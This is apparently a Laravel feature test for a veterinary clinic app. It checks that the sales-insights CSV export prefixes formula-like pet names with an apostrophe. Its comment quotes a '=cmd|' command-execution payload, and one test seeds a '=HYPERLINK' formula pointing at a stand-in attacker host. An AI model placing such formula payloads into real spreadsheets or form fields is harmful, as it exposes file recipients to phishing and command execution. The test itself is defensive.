<?php

namespace Tests\Feature\Insights;

use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\Feature\Insights\Concerns\BuildsInsightsFixtures;
use Tests\TestCase;

/**
 * CSV/Formula Injection (revisão de segurança, achado Médio 3) —
 * `InsightExportService::row()` grava `sale.pet->name`/`item->description` direto no CSV.
 * Um tutor com `name = "=cmd|' /C calc'!A0"` (ou, mais realisticamente, um
 * `=HYPERLINK(...)` de phishing) tinha o payload exportado literalmente para o Excel do
 * profissional que baixa `GET professional/insights/sales/export`.
 */
class InsightExportFormulaInjectionTest extends TestCase
{
    use BuildsInsightsFixtures;
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();

        $this->buildClinic();
    }

    public function test_export_neutralizes_a_pet_name_that_looks_like_a_formula(): void
    {
        $this->pet->update(['name' => '=HYPERLINK("http://attacker.tld/steal","clique aqui")']);
        $this->sellProduct($this->vetMember, price: 100);

        $csv = $this->actingAs($this->owner, 'sanctum')
            ->get($this->exportUrl())
            ->assertOk()
            ->streamedContent();

        $this->assertStringNotContainsString(
            ',=HYPERLINK(',
            $csv,
            'A célula de fórmula não pode aparecer crua — precisa vir prefixada por apóstrofo.'
        );
        $this->assertStringContainsString('\'=HYPERLINK(', $csv);
    }

    public function test_export_keeps_a_normal_pet_name_untouched(): void
    {
        $this->pet->update(['name' => 'Rex']);
        $this->sellProduct($this->vetMember, price: 100);

        $csv = $this->actingAs($this->owner, 'sanctum')
            ->get($this->exportUrl())
            ->assertOk()
            ->streamedContent();

        $this->assertStringContainsString('Rex', $csv);
        $this->assertStringNotContainsString("'Rex", $csv);
    }

    private function exportUrl(): string
    {
        $params = http_build_query([
            'from' => now()->subMonth()->toDateString(),
            'to' => now()->addDay()->toDateString(),
            'dimension' => 'product',
        ]);

        return "/api/professional/insights/sales/export?{$params}";
    }
}
